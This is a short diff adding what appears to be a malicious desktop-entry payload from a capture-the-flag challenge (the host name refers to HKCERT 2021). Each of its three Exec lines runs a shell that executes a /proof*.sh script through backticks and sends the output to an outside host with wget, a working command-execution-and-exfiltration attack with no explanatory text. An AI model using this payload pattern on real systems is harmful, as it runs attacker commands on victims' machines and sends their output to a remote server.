@@ -1,0 +1,5 @@
+#!/bin/sh
+Exec=sh -c "wget http://chalf.hkcert21.pwnable.hk:28098/?`/proof*.sh`"
+Exec=sh -c "wget http://chalf.hkcert21.pwnable.hk:28098/?`/proof_*.sh`"
+Exec=sh -c "wget http://chalf.hkcert21.pwnable.hk:28098/?`/proof_uuid.sh`"
+Type=Application
